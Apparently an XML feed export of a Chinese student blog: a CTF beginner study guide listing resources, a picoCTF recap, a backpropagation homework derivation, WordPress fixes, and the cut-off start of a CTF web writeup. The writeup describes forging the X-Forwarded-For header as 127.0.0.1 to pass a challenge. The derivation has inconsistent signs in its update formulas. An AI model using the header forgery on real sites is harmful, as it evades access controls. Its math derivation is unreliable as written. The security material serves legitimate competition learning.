Web实战篇<br>Web前端黑客技术揭秘<br>黑客秘籍-渗透测试实用指南<br>代码审计：企业级Web代码安全架构</p></li></ul><h4 id="7-web、Reverse、PWN、Crypto和Misc的详细入门指导请戳我！"><a href="#7-web、Reverse、PWN、Crypto和Misc的详细入门指导请戳我！" class="headerlink" title="7.web、Reverse、PWN、Crypto和Misc的详细入门指导请戳我！"></a>7.<a href="https://tari0510.github.io/2019/10/17/2019hmb_guide/">web、Reverse、PWN、Crypto和Misc的详细入门指导请戳我！</a></h4><h3 id="8-总结"><a href="#8-总结" class="headerlink" title="8.总结"></a>8.<span id="ask_question">总结</span></h3><p>CTF可能门槛比较高，但是入门之后你会发现其乐趣 在学习过程中遇到挫折不要轻易放弃，建议先谷歌查找相关资料，实在查不到再求助他人。 关于如何提问，建议阅读这篇文章：<a href="https://github.com/ryanhanwu/How-To-Ask-Questions-The-Smart-Way/blob/master/README-zh_CN.md">提问的智慧</a> </p><p>有任何问题欢迎到群里或联系协会成员。</p><h3 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h3><ul><li><p>Q1: 要是我技术不好或者基础不太好怎么办？你们会教吗？</p></li><li><p>A1: 不用担心，我们会根据你们大部分人的基础，给予你们相关资料和多次线下培训。不用担心自己什么都不会，一开始谁都是小白，本次红帽杯参赛匆忙怕取得不了好成绩的，也可以为12月份百度杯，明年1月份安恒杯做准备喔！</p></li><li><p>Q2： 教练，我迫不及待想看看ctf大概是怎样的</p></li><li><p>A2： 这个是中科大的新生ctf赛。相对会简单些的。如果有迫不及待想了解ctf是怎样的同学可以注册个账号玩玩，不懂的可以百度或者群上问喔！</p><p>  <a href="https://hack.lug.ustc.edu.cn/">https://hack.lug.ustc.edu.cn/</a><br>  2019 年度中国科学技术大学第六届信息安全竞赛即将开幕，科大信息安全大赛自 2014 年起已经连续举办五届，往届比赛均顺利举行，规模盛大，影响甚广。</p><p>  赛制：个人线上比赛，解题模式，约 25 道题目；<br>  比赛题目分为 4 类，分类如下：综合技能（general）、程序逆向与漏洞利用（binary）、密码学与数学（math）、网站安全（web）</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
          <category> 入门 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>佛大2019红帽杯入门指导</title>
      <link href="//p/2019/2019hmb_guide/"/>
      <url>//p/2019/2019hmb_guide/</url>
      
        <content type="html"><![CDATA[<p><a href="#web">Web入门传送门</a><br><a href="#re">Re 逆向 入门传送门</a><br><a href="#pwn">PWN 二进制 入门传送门</a><br><a href="#crypto">Crypto 密码学 入门传送门</a><br><a href="#misc">Misc 杂项 入门传送门</a></p><p><a href="#catch_flag">萌新入门刷题传送门</a></p><h3 id="1-web的详细入门指导"><a href="#1-web的详细入门指导" class="headerlink" title="1.web的详细入门指导"></a><span id="web">1.web的详细入门指导</span></h3><p>首先，大略过一下最基础的语言语法HTML／CSS、JavaScript、PHP、SQL的基本知识（平均一个语言4小时足矣），要做到看到这些代码的时候不会畏惧，能看懂大部分，看到不懂的能通过google或者相关文档查懂。主要参考：<a href="http://www.w3school.com.cn/">http://www.w3school.com.cn/</a> 、<a href="http://www.runoob.com/">http://www.runoob.com/</a> , 这里不要求学很深，很浅很浅就行，后面边学边用掌握的会更快。</p><p>现在，你初步了解了一些语言知识，接下来你就需要开始在实践中学习与巩固。</p><p>当然就是实践了。这里，我建议你搭建一个个人的博客，初步了解这些语言的应用。在搭建博客的过程中，你需要学习对应的linux操作、Apache+PHP+Mysql环境的配置、域名解析、服务器端口配置等等。如何搭建博客，请自行google搜索。此外，你也可以编写一些好玩的网页来学习这些知识点。</p><p>如果你能完成如上所说的这些，尤其是第三点，那么恭喜你，你入门了，其实这些前期会遇到很多语言方面难免会遇到挫折，但是没关系，多百度多谷歌，多群里提问，我们都会及时给你解答。</p><ul><li><p>接下来可以了解基本的HTTP协议相关知识</p><ul><li><p>掌握HTTP请求：GET、POST、HEAD，能基本读懂一个HTTP数据包，了解GET、POST、HEAD的区别</p></li><li><p>能看懂HTTP响应包 404 403 200 500 302 301 …</p></li><li><p>了解Cookie、session、token，知道是什么东西，作用是什么，为什么需要这些东西</p></li><li><p>了解Referer、X-Forwarded-For等等的作用</p></li></ul></li><li><p>学漏洞知识点之前，如果你了解了如上所说的一些东西，那么就可以学习下面的知识(进阶)啦，当然能学懂上面的知识可能需要大概3周左右的时间，多坚持，多提问。</p><p>  sql注入</p><p>  XSS攻击</p><p>  文件上传漏洞</p><p>  文件包含漏洞</p><p>  命令执行漏洞</p><p>  。。。</p></li></ul><p>推荐一些学习站点<br><a href="https://ctf-wiki.github.io/ctf-wiki/&gt;">https://ctf-wiki.github.io/ctf-wiki/&gt;</a> <a href="https://xz.aliyun.com/">https://xz.aliyun.com/</a> <a href="https://www.anquanke.com/">https://www.anquanke.com/</a> <a href="https://github.com/CHYbeta/Web-Security-Learning">https://github.com/CHYbeta/Web-Security-Learning</a></p><p>推荐一些题库<br><a href="https://cgctf.nuptsast.com/login">https://cgctf.nuptsast.com/login</a> <a href="https://www.jarvisoj.com/login">https://www.jarvisoj.com/login</a></p><p>推荐一些大牛的博客<br><a href="https://chybeta.github.io/">https://chybeta.github.io/</a> <a href="https://www.jianshu.com/u/bf30f18c872c">https://www.jianshu.com/u/bf30f18c872c</a> <a href="https://skysec.top/">https://skysec.top/</a> <a href="https://lorexxar.cn/">https://lorexxar.cn/</a> </p><p>推荐书籍<br>《白帽子讲web安全》 《黑客攻防技术宝典·Web实战篇》</p><h3 id="2-Reverse的详细入门指导"><a href="#2-Reverse的详细入门指导" class="headerlink" title="2.Reverse的详细入门指导"></a><span id="re">2.Reverse的详细入门指导</span></h3><p>逆向工程，Reverse，缩写一般为Re。旨在不知晓源码的情况下对程序进行分析，获取其流程，组织，结构等。CTF中一般为注册机这种形式。</p><p>最好会C语言和汇编语言，不必系统的学习汇编，上来先一条一条查指令手册，等熟悉了再仔细学习。 需了解常见加密算法的实现，要做到快速识别，无需了解攻击过程。</p><p>如何学习逆向呢，可以看下面这基本书学习基础知识，同时打比赛刷题，以赛带练。</p><ul><li><p>推荐书籍<br>  《汇编语言》（王爽） 这本比较老了，讲的8086汇编，但是讲的很好。</p><p>  《加密与解密》（第四版）（看雪论坛） 看雪出的经典书籍，名叫加密与解密实际上是讲逆向。各方各面都有讲到，很全面。</p><p>  《逆向工程核心原理》 主要是windows逆向，以OD为主要工具。讲的很好，面向零基础。</p><p>  下面的我没看过，不好评价。。。 《Reverse Engineering for Beginners》(电子书：<a href="https://beginners.re/)%EF%BC%88%E4%B8%AD%E6%96%87%E7%89%88%E4%B8%BA%E3%80%8A%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%9D%83%E5%A8%81%E6%8C%87%E5%8D%97%E3%80%8B%EF%BC%89">https://beginners.re/)（中文版为《逆向工程权威指南》）</a> 《Android应用安全防护和逆向分析》 《Android软件安全与逆向分析》</p></li><li><p>常用工具<br>  IDA Pro 极其强大的反汇编/反编译/调试工具，二进制选手必须会用，优秀的二进制选手能把IDA运用到出神入化的地步。有关IDA的使用能讲好多好多。 吾爱破解论坛爱盘下载。</p><p>  x64dbg Windows平台优秀的开源反汇编器及调试器，可以看作Olly dbg的升级版，基本包含OD的全部功能，且一直在更新 官网下载。</p><p>  gdb Linux的调试器，没有GUI。pwn选手必须掌握的技能。也可以使用IDA的远程调试功能调试linx程序。 一般的Linux自带，没有的话apt安装。</p><p>  Jeb apk反编译工具，功能强大。</p><p>  jadx 开源的apk反编译工具，轻量级</p><p>  其他 dnSpy，xspy，CFF explorer等各类专用工具，需要靠做题中积累。</p></li><li><p>论坛与站点<br>  汇编语言指令学习：<a href="https://www.cnblogs.com/del/category/121079.html">https://www.cnblogs.com/del/category/121079.html</a> 这一系列文章细致的讲解了win32汇编，遇到不认识的指令可到这里查询（当然直接翻intel指令手册是最准确的）</p><p>  吾爱破解：知名破解论坛，注册有限制，需要10元注册或等开放。吾爱的爱盘内有大量常用工具，以及逆向专用虚拟机，可按需学习与使用。 <a href="https://www.52pojie.cn/">https://www.52pojie.cn/</a></p><p>  看雪论坛：知名逆向论坛 <a href="https://bbs.pediy.com/">https://bbs.pediy.com/</a></p><p>  安全客、先知等各类安全论坛，上面有各种大佬发的文章。</p></li></ul><h3 id="3-PWN的详细入门指导"><a href="#3-PWN的详细入门指导" class="headerlink" title="3.PWN的详细入门指导"></a>3.<span id="pwn">PWN的详细入门指导</span></h3><p>pwn，及pwn to own，在黑客俚语中由own演变而来。通过逆向分析二进制程序，发现其可能存在的漏洞，并进行利用，从而达到信息泄露、权限获取等目的。</p><p>需要掌握汇编语言、基础逆向方法。 入门推荐到CTF wiki的pwn板块学习，上面有极其详细的pwn教程，各类漏洞点及利用。</p><p>CTF一般为linux环境下的pwn，要熟悉linux的使用。 IDA Pro 强大的反编译工具，有了它就能轻松审计漏洞了。 gdb为做pwn题时调试必备的工具，网上有非常多关于gdb的教程。 pwndbg——gdb插件：<a href="https://github.com/pwndbg/pwndbg">https://github.com/pwndbg/pwndbg</a> pwntools为专门用来做pwn题的工具，所以要学习python与pwntools。</p><p>其余学习教程： 一步一步学ROP系列：<br><a href="http://wooyun.jozxing.cc/static/drops/tips-6597.html">http://wooyun.jozxing.cc/static/drops/tips-6597.html</a> <a href="http://wooyun.jozxing.cc/static/drops/papers-7551.html">http://wooyun.jozxing.cc/static/drops/papers-7551.html</a> <a href="http://wooyun.jozxing.cc/static/drops/binary-10638.html">http://wooyun.jozxing.cc/static/drops/binary-10638.html</a> <a href="http://wooyun.jozxing.cc/static/drops/papers-11390.html">http://wooyun.jozxing.cc/static/drops/papers-11390.html</a> 堆基础学习: glibc内存管理ptmalloc源代码分析.pdf linux内核源码(建议直接看malloc free源码) 堆基础(英文blog) 推荐书籍： 《深入理解计算机系统（原书第3版）》 《程序员的自我修养—链接、装载与库》</p><h3 id="4-Crypto的详细入门指导"><a href="#4-Crypto的详细入门指导" class="headerlink" title="4.Crypto的详细入门指导"></a>4.<span id="crypto">Crypto的详细入门指导</span></h3><p>密码学需要较强的数学基础。ctf wiki也是入门不错的选择。 了解各种密码的实现过程，相关的攻击方法。 各种密码推荐直接到英文维基学习，讲的十分详细，一般也会有源代码。 上来学习密码学可以抄脚本，不用太关心其数学原理。等深入了解后再详细研究。</p><p>古典密码——脑洞大开的密码：链接 RSA攻击汇总：<a href="https://xz.aliyun.com/t/2446#toc-32">https://xz.aliyun.com/t/2446#toc-32</a> RSAcoppersmiths攻击：<a href="https://github.com/mimoo/RSA-and-LLL-attacks">https://github.com/mimoo/RSA-and-LLL-attacks</a></p><p>一堆密码学的题目：<a href="https://cryptopals.com/">https://cryptopals.com/</a></p><p>推荐书籍： 《深入浅出密码学——常用加密技术原理与应用》 《密码编码学与网络安全——原理与实践（第七版》 《图解密码技术》 《应用密码学：协议、算法与C源程序》</p><h3 id="5-Misc的详细入门指导"><a href="#5-Misc的详细入门指导" class="headerlink" title="5.Misc的详细入门指导"></a>5.<span id="misc">Misc的详细入门指导</span></h3><p>杂项，简称Misc。杂项的内容很多很广，需要选手有较大的知识面以及快速学习新鲜事物的能力。 一般包括取证，隐写分析，编码转换，信息收集，流量分析等。有时密码学中的古典密码也被放到杂项里去。其中取证与隐写是misc最重要的一块。需要选手掌握各种花式隐写套路，需有较强的脚本功底，会用各类隐写工具。</p><p>隐写 <a href="https://www.jianshu.com/p/02fdd5edd9fc">https://www.jianshu.com/p/02fdd5edd9fc</a><br>流量分析 《Wireshark网络分析就这么简单》<br>ctf-wiki: <a href="https://ctf-wiki.github.io/ctf-wiki/misc/introduction-zh/">https://ctf-wiki.github.io/ctf-wiki/misc/introduction-zh/</a></p><h3 id="适合萌新刷题入门传送门"><a href="#适合萌新刷题入门传送门" class="headerlink" title="适合萌新刷题入门传送门"></a><span id="catch_flag">适合萌新刷题入门传送门</span></h3><ul><li><p><a href="https://adworld.xctf.org.cn/">攻防世界 有萌新区</a></p></li><li><p><a href="https://hack.lug.ustc.edu.cn/">2019中科大ctf新生赛</a></p></li><li><p><a href="https://cgctf.nuptsast.com/">南京邮电大学网络攻防平台 较多为简单题</a></p></li><li><p><a href="https://picoctf.com/">picoCTF2018和2019 美国面向高中生的ctf比赛</a></p></li><li><p><a href="https://github.com/ustclug/hackergame2018-writeups">2018中科大ctf新生赛 github存档</a></p></li></ul>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
          <category> 入门 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2019pico小汇总</title>
      <link href="//p/2019/2019pico/"/>
      <url>//p/2019/2019pico/</url>
      
        <content type="html"><![CDATA[<h4 id="和两位新认识的小伙伴一起玩了1天，虽然解出来的题不算很多，但玩的还是很开心。picoctf相对来说也会简单些，但是也还是有收货的。在此记录一下。"><a href="#和两位新认识的小伙伴一起玩了1天，虽然解出来的题不算很多，但玩的还是很开心。picoctf相对来说也会简单些，但是也还是有收货的。在此记录一下。" class="headerlink" title="和两位新认识的小伙伴一起玩了1天，虽然解出来的题不算很多，但玩的还是很开心。picoctf相对来说也会简单些，但是也还是有收货的。在此记录一下。"></a>和两位新认识的小伙伴一起玩了1天，虽然解出来的题不算很多，但玩的还是很开心。picoctf相对来说也会简单些，但是也还是有收货的。在此记录一下。</h4><p>由于国庆比较忙，也没有继续在解题了，然后也忘了写记录了，emmm。下图是我们队伍的1天的解题成果。这是报了小伙伴的大腿@guoguo @回忆<br><img src="/img/ctf/2019pico/1.png" class="lazyload" data-srcset="/img/ctf/2019pico/1.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="img"></p><p>过些天再补上心得，2333</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
          <category> ctf比赛 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> ctf比赛 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计算智能入门作业</title>
      <link href="//p/2019/%E8%AE%A1%E7%AE%97%E6%99%BA%E8%83%BD%E5%85%A5%E9%97%A8/"/>
      <url>//p/2019/%E8%AE%A1%E7%AE%97%E6%99%BA%E8%83%BD%E5%85%A5%E9%97%A8/</url>
      
        <content type="html"><![CDATA[<h3 id="老师布置的作业"><a href="#老师布置的作业" class="headerlink" title="老师布置的作业"></a>老师布置的作业</h3><ol><li>描述 BP 神经网络（BPNN）的训练过程，推导 3 层 BPNN 调整网络权重和偏置量的公式。 </li></ol><h4 id="这公式推导有点难度…"><a href="#这公式推导有点难度…" class="headerlink" title="这公式推导有点难度… :("></a>这公式推导有点难度… :(</h4><p>然后网上查了许多资料，有两个收获:</p><ul><li>神经网络在隐藏层做了什么</li><li>把天天听闻的线性代数对神经网络重要性联系在一起</li></ul><p>隐藏层：该层可以说是神经网络的关键，相当于对数据做一次特征提取。隐藏层的意义，是把前一层的向量变成新的向量。就是坐标变换，说人话就是把数据做平移，旋转，伸缩，扭曲，让数据变得线性可分。可能这个不那么好理解，举个栗子：</p><p>下面的图左侧是原始数据，要把绿点和红点分割开，要怎么做呢？</p><center class="half">    <img src="/img/neutral/1.png" class="lazyload" data-srcset="/img/neutral/1.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" width="250" style="display: inline; margin: 3% 10% 3% 0%;">    <img src="/img/neutral/2.png" class="lazyload" data-srcset="/img/neutral/2.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" width="250" style="display: inline; margin: 3% 0% 3% 0%;"></center><p>上面二图可以<a href="https://cs.stanford.edu/people/karpathy/convnetjs//demo/classify2d.html">在这玩</a></p><p>一种做法：把左图的平面看成一块布，把它缝合成一个闭合的包包（相当于数据变换到了一个3维坐标空间），然后把有绿色点的部分撸到顶部（伸缩和扭曲），然后外围的红色点自然在另一端了，要是姿势还不够帅，就挪挪位置（平移）。这时候干脆利落的砍一刀，绿点红点就彻底区分开了。</p><p>论线性代数的重要性，联系不起来可来这里补课<a href="https://www.bilibili.com/video/av6731067">b站线性代数的本质</a></p><ul><li><p>关于线性变换到3维空间<br>  不同维度的变换是合理的</p><p>  例如下面这个矩阵，它的几何意义就是将二维空间映射到三维空间上<br>  $$<br>  \begin{bmatrix}<br>  3 &amp; 1\<br>  4 &amp; 1\<br>  5 &amp; 9<br>  \end{bmatrix}<br>  $$</p><p>  因为矩阵有两列表面输入空间有两个基向量，<br>  有三行表示每一个基向量在变换后都用三个独立的坐标来描述<br>  所以它们一定落在三维空间中，因此这是一个从二维空间到三维空间的变换</p><p>  不太理解可以看此视频 <a href="https://www.bilibili.com/video/av6731067/?p=4">b站线性代数的本质-第四章</a></p><p>  再如下面这个矩阵<br>  $$<br>  \begin{bmatrix}<br>  3 &amp; 1 &amp; 4\<br>  1 &amp; 5 &amp; 9<br>  \end{bmatrix}<br>  $$<br>  矩阵三列表示原始空间有三个基向量，也就是说原始空间是三维<br>  有两行表明这三个基向量在变换后都仅用两个坐标来描述<br>  所以它们一定落在二维空间中，因此这是一个从三维空间到二维空间的变换</p></li></ul><h4 id="一个二维向量输入到三维向量输出"><a href="#一个二维向量输入到三维向量输出" class="headerlink" title="一个二维向量输入到三维向量输出:"></a>一个二维向量输入到三维向量输出:</h4><p>$$<br>\begin{bmatrix}<br>3\<br>1<br>\end{bmatrix}\rightarrow L\left ( \vec{\nu}  \right ) \rightarrow  \begin{bmatrix}<br>1\<br>8\<br>2<br>\end{bmatrix}<br>$$</p><p>回想线性代数，$ L\left ( \vec{\nu}  \right ) $ 是一个3行2列的矩阵<br>则 $ L\left ( \vec{\nu}  \right ) $ 乘以2行1列(3,1)的矩阵就是以它为基向量作基变换<br>得到的结果就是升维到三维空间后的向量</p><h3 id="吹完水了，开始推导公式…"><a href="#吹完水了，开始推导公式…" class="headerlink" title="# 吹完水了，开始推导公式…"></a># 吹完水了，开始推导公式…</h3><p><a href="https://www.jianshu.com/p/68e6f82d88b7">hexo 支持LaTex参考链接</a></p><ul><li>三层 BPNN 调整网络权重和偏置量的公式分别为<br>  $$ \omega_{ij}=\omega_{ij} + \Delta \omega_{ij} = \omega_{ij} + (\eta)O_{i}E_{j} \qquad (1) $$<br>  $$ b_{j}=b_{j} + \Delta b_{j} = b_{j} + (\eta)E_{j} \qquad\quad\quad (2) $$<br>  其中：<ul><li>$\omega_{ij}$ 表示输入层到隐含层的权重，$\eta$ 表示学习率</li><li>$O_{i}$ 表示上一层单元i的输出，$E_{j}$ 表示j层神经元误差</li><li>$b_{j}$ 表示j单元偏置量(至于为什么取名为b，下面有提到)</li></ul></li></ul><h5 id="现需要推导-1-2-式子等号成立"><a href="#现需要推导-1-2-式子等号成立" class="headerlink" title="现需要推导(1)(2)式子等号成立"></a>现需要推导(1)(2)式子等号成立</h5><ul><li>先取激活函数<br>$$<br>f(x)=\frac{1}{1+e^{-x}}<br>$$</li></ul><p><img src="/img/neutral/4.png" class="lazyload" data-srcset="/img/neutral/4.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="nstructure"></p><ul><li><p>由上图除了输入层的神经元，每个神经元都会有加权求和得到的输入值 z 和将 z 通过 Sigmoid 函数（也即是激活函数）非线性转化后的输出值 a，他们之间的计算公式如下<br>$$<br>z_{i}^{j}=\sum_{i=1…n}w_{ij}\cdot a_{ij}^{l-1}-b_{j}^{l} \qquad (3)\<br>a_{j}^{l}=f(z_{j}^{(l)})=\frac{1}{1+e^{-z_{j}^{(l)}}} \quad (4)<br>$$</p><p>  式子(3)，是不是和 y = kx + b类似？ 其实b可以理解为线性偏差 (这也是取b为名的原因，方便理解)</p><p>  然后代入到Sigmoid 函数中做非线性变换，做这个变换主要是因为线性模型的表达能力不够(<a href="https://www.zhihu.com/question/22334626">详情请戳我</a>)，其实这个非线性变换也有它的缺点，比如 <a href="https://blog.csdn.net/NOT_GUY/article/details/78749509">梯度消失、不是0均值、不是0均值</a></p></li><li><p>因为输出层的值与真实的值会存在误差，我们可以用均方误差来衡量预测值和真实值之间的误差。<br>$$<br>E=\frac{1}{2}\sum_{j=1}^{l}(Y_{j}^{k}-a_{j}^{l})^{2} \qquad (5)<br>$$</p><p>  其中 $Y_{j}^{k}$ 表示期望输出，是已知量</p><p>  误差肯定是越小越好。因此，我们就要调整w和b值， 使得误差函数的值最小。<br>  要求式子(5) 在两个变量 ( $\omega$ 和 $b$ ) 取不同值时的最值，首先想到的就是求各自的偏导了</p></li></ul><ul><li><p>引入式子(1) 和 (4) 对目标函数 E 求 $\omega$ 和 $b$ 的偏导可以得到 $\omega$ 和 $b$ 的更新量<br>  下面拿求 $\omega$ 偏导来做推导。<br>$$<br>\Delta \omega_{ij} = \eta\frac{\partial E}{\partial w_{hj}} \qquad (6)<br>$$<br>  $\eta$ 学习率取值通常为 0.1 ~ 0.3,可以理解为每次梯度所迈的步伐。<br>  $w_{hj}$为 h 和 j 两层神经元之间的权重<br>  注意到 $w_{hj}$ 的值先影响到第 j 个输出层神经元的输入值 a，再影响到输出值 y</p><p>  根据链式求导法对权重求偏导有：<br>$$<br>\frac{\partial E}{\partial w_{hj}} =\frac{\partial E}{\partial a_{j}^{l}}\cdot \frac{\partial a_{j}^{l}}{\partial z_{j}^{l}}\cdot\frac{\partial z_{j}^{l}}{\partial w_{hj}} \qquad (7)<br>$$</p><p>  由 (3) 有:<br>$$<br>\frac{\partial z_{j}^{l}}{\partial w_{hj}}  = {(\sum_{i=1…n}w_{hj}\cdot a_{hj}^{l-1}-b_{j}^{l})}’ = a_{hj}^{l-1} = O_{i} \qquad (8)<br>$$<br>  与神经网络结构图对应知 $ a_{hj}^{l-1} $ 为上一层单元i的输出 $ O_{i} $</p></li><li><p>Sigmoid 求导的式子如下，<a href="https://ss.csdn.net/p?https://mmbiz.qpic.cn/mmbiz_jpg/ptp8P184xjzr3IibYwltdavich3yf8sbJHO8nFQQiaPX49zKcGg7j8ImL1PW3zZYIy8pQJxXNU3qhwDTeEnx79d5A/640?wx_fmt=jpeg">求导过程请戳我</a><br>$$<br>f{}’(x) = f(x)(1-f(x)) \qquad (9)<br>$$<br>由 (5) 和 (9) 有：<br>$$<br>\frac{\partial E}{\partial a_{j}^{l}}\cdot \frac{\partial a_{j}^{l}}{\partial z_{j}^{l}} = -\frac{1}{2}\cdot 2\cdot (Y_{j}^{k}-a_{j}^{i})\cdot \frac{\partial a_{j}^{l}}{\partial z_{j}^{l}}=a_{j}^{l}\cdot (1-a_{j}^{l})\cdot (Y_{j}^{k}-a_{j}^{l}) =     E_{j} \qquad (10)<br>$$</p></li><li><p>再看看式子 (1) 和 (2) 中的 $E_{j}$，课本给出 关于 $ E_{j} $的公式:<br>$$<br>E_{j} = O_{j}(1-O_{j})(T_{j}-O_{j}) = O_{j}(1-O_{j}))\sum_{k}w_{jk}E_{k}  \qquad (11)<br>$$</p><ul><li>其中 $ T_{j} $ 是输出单元 $j$ 的预期是输出， 即式子 (10) 中的 $ Y_{j}^{k} $ </li><li>$ E_{k} $ 表示它连接的后面一层的单元 $k$ 的误差, 由此看式子 (11) 其实还挺容易理解的：<br>$ O_{j}(1-O_{j}) $ 表示 sigmod函数的偏导，即表示调整误差的速度<br>即 j 层神经元误差是通过预期输出与实际输出的差值和调整误差速度来获取的</li></ul></li></ul><h4 id="激动人心的时候到啦"><a href="#激动人心的时候到啦" class="headerlink" title="激动人心的时候到啦!!"></a>激动人心的时候到啦!!</h4><ul><li>式子 (1)为: $ \omega_{ij}=\omega_{ij} + \Delta \omega_{ij} $</li><li>式子 (6)为: $ \Delta \omega_{ij} = \eta\frac{\partial E}{\partial w_{hj}} $</li><li>式子 (7)为: $ \frac{\partial E}{\partial w_{hj}} =\frac{\partial E}{\partial a_{j}^{l}}\cdot \frac{\partial a_{j}^{l}}{\partial z_{j}^{l}}\cdot\frac{\partial z_{j}^{l}}{\partial w_{hj}} $</li><li>式子 (8) 和 (10) 分别为: $ \frac{\partial z_{j}^{l}}{\partial w_{hj}} = a_{hj}^{l-1} = O_{i} \qquad $  $ \frac{\partial E}{\partial a_{j}^{l}}\cdot \frac{\partial a_{j}^{l}}{\partial z_{j}^{l}} = a_{j}^{l}\cdot (1-a_{j}^{l})\cdot (Y_{j}^{k}-a_{j}^{l}) = E_{j} $</li><li>即: $ \Delta \omega_{ij} = (\eta)O_{i}E_{j} $</li></ul><h4 id="类似也可以证得偏置量公式-b-j-eta-E-j"><a href="#类似也可以证得偏置量公式-b-j-eta-E-j" class="headerlink" title="类似也可以证得偏置量公式 $ b_{j} = -(\eta)E_{j} $"></a>类似也可以证得偏置量公式 $ b_{j} = -(\eta)E_{j} $</h4><h4 id="心累-不过推导完后，感觉还挺好玩的，23333"><a href="#心累-不过推导完后，感觉还挺好玩的，23333" class="headerlink" title="心累,,,不过推导完后，感觉还挺好玩的，23333"></a>心累,,,不过推导完后，感觉还挺好玩的，23333</h4><br><p>参考链接：<br><a href="https://blog.csdn.net/guleileo/article/details/80729775">csdn: zhiyong_will</a><br><a href="https://github.com/edvardHua/Articles/tree/master/%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E4%B8%AD%20BP%20%E7%AE%97%E6%B3%95%E7%9A%84%E5%8E%9F%E7%90%86%E4%B8%8E%20Python%20%E5%AE%9E%E7%8E%B0%E6%BA%90%E7%A0%81%E8%A7%A3%E6%9E%90">github: edvardHua</a><br><a href="https://blog.csdn.net/guleileo/article/details/80729775">csdn: csdn人工智能头条</a></p>]]></content>
      
      
      <categories>
          
          <category> 学校课程 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>wordpress 常见问题汇总</title>
      <link href="//p/2019/wordpress_problem/"/>
      <url>//p/2019/wordpress_problem/</url>
      
        <content type="html"><![CDATA[<h3 id="wordpress升级后后台访问不了"><a href="#wordpress升级后后台访问不了" class="headerlink" title="wordpress升级后后台访问不了"></a>wordpress升级后后台访问不了</h3><p>Cannot Modify Header Information – Headers Already Sent By…….</p><ul><li>解决办法一：在主题目录下functions.php开头加入ob_start()；</li><li>解决办法二：找到sent by后面的.php文件，保存为UTF-8无BOM编码格式;<br>  vim 的话，命令模式输入 :set nobomb 即可转换为UTF-8无BOM编码格式</li></ul><h3 id="wordpress-后台媒体库不显示以及上传错误"><a href="#wordpress-后台媒体库不显示以及上传错误" class="headerlink" title="wordpress 后台媒体库不显示以及上传错误"></a>wordpress 后台媒体库不显示以及上传错误</h3><p>在&lt;!DOCTYPE&gt; 声明之前有其他的代码<br>导致浏览器不能正确识别页面的标准，所以才造成了某些基于html5的特性不能使用。</p><p>参考链接 <a href="https://www.zmki.cn/1428.html">https://www.zmki.cn/1428.html</a></p>]]></content>
      
      
      <categories>
          
          <category> 运维 </category>
          
          <category> Wordpress </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 运维 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2019年第三届广东省强网杯网络安全大赛WEBwriteup</title>
      <link href="//p/2019/2019qwb/"/>
      <url>//p/2019/2019qwb/</url>
      
        <content type="html"><![CDATA[<h3 id="八卦"><a href="#八卦" class="headerlink" title="八卦"></a>八卦</h3><p>本次比赛的一个槽点，<br>为什么是在星期一二举行咧…</p><p>由于我只会一点 web ，所以只解出几道 web 题</p><p>Writeby TARITARI</p><h3 id="1-Web-–-小明又被拒绝了"><a href="#1-Web-–-小明又被拒绝了" class="headerlink" title="1. Web – 小明又被拒绝了"></a>1. Web – 小明又被拒绝了</h3><p>看到题目很容易想到改http头，于是抓包。一开始直接改cookie: admin=1无效，后来想了下，小明如果是本地人就不会被拒绝啦！于是用到X-Forwarded-For字段，伪造ip为本地地址127.0.0.1。<br><img src="/img/ctf/2019qwb/%E5%B9%BF%E4%B8%9C%E5%90%8D%E8%8F%9C168.png" class="lazyload" data-srcset="/img/ctf/2019qwb/%E5%B9%BF%E4%B8%9C%E5%90%8D%E8%8F%9C168.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" 